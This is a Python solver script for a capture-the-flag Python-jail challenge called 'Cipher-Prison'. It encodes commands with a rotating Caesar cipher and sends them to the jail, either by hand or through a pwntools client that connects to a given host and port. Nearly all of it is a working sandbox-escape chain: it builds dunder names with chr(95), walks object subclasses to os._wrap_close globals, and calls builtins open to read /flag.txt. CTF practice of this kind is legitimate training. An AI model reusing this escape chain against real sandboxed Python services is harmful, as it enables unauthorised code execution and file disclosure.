#!/usr/bin/env python3
"""
Solver for Cipher-Prison (PyJail 2)
===================================

WORKING EXPLOIT - Tested and confirmed!

Key points:
- Input is encoded with rotating Caesar cipher (+7 each command)
- Output is NOT scrambled (displayed normally)
- Variables persist between commands
- '_' is blocked but chr(95) returns '_'
"""

ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def encode(text, rotation):
    """Encode text to send at given rotation"""
    rotated = ALPHABET[rotation:] + ALPHABET[:rotation]
    return text.translate(str.maketrans(ALPHABET, rotated))

# ============== WORKING EXPLOIT ==============

EXPLOIT_STEPS = [
    (0,  'u=chr(95)*2'),                                           # u = '__'
    (7,  'c=getattr("",u+"class"+u)'),                             # c = <class 'str'>
    (14, 'b=getattr(c,u+"bases"+u)[0]'),                           # b = <class 'object'>
    (21, 's=getattr(b,u+"subclasses"+u)()'),                       # s = all subclasses
    (28, 'w=s[158]'),                                              # w = os._wrap_close (index varies!)
    (35, 'g=getattr(getattr(w,u+"init"+u),u+"globals"+u)'),        # g = __globals__
    (42, 'print(g[u+"builtins"+u]["open"]("/flag.txt").read())'),  # READ FLAG!
]

def generate_exploit():
    """Generate the encoded exploit payload"""
    print("=" * 60)
    print("CIPHER-PRISON EXPLOIT")
    print("=" * 60)
    
    payload_lines = []
    for rot, cmd in EXPLOIT_STEPS:
        encoded = encode(cmd, rot)
        print(f"# Rot {rot:02d}: {cmd}")
        print(f"{encoded}")
        print()
        payload_lines.append(encoded)
    
    return payload_lines

def interactive_encoder():
    """Interactive encoder"""
    rotation = 0
    step = 7
    
    print("Cipher-Prison Encoder")
    print("Type 'exploit' to see full exploit, 'q' to quit")
    
    while True:
        cmd = input(f"\n[Rot {rotation:02d}] Command: ").strip()
        
        if cmd.lower() == 'q':
            break
        if cmd.lower() == 'exploit':
            generate_exploit()
            continue
        if cmd.lower() == 'reset':
            rotation = 0
            continue
            
        encoded = encode(cmd, rotation)
        print(f"  Send: {encoded}")
        rotation = (rotation + step) % len(ALPHABET)

def auto_solve(host="localhost", port=1337):
    """Automated solver"""
    try:
        from pwn import remote, log
    except ImportError:
        print("Install pwntools: pip install pwntools")
        generate_exploit()
        return
    
    r = remote(host, port)
    r.recvuntil(b">>> ")
    
    for rot, cmd in EXPLOIT_STEPS:
        encoded = encode(cmd, rot)
        log.info(f"[Rot {rot:02d}] {cmd}")
        r.sendline(encoded.encode())
        try:
            r.recvuntil(b">>> ", timeout=3)
        except:
            pass
    
    r.interactive()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "solve":
        host = sys.argv[2] if len(sys.argv) > 2 else "localhost"
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 1337
        auto_solve(host, port)
    elif len(sys.argv) > 1 and sys.argv[1] == "exploit":
        generate_exploit()
    else:
        interactive_encoder()
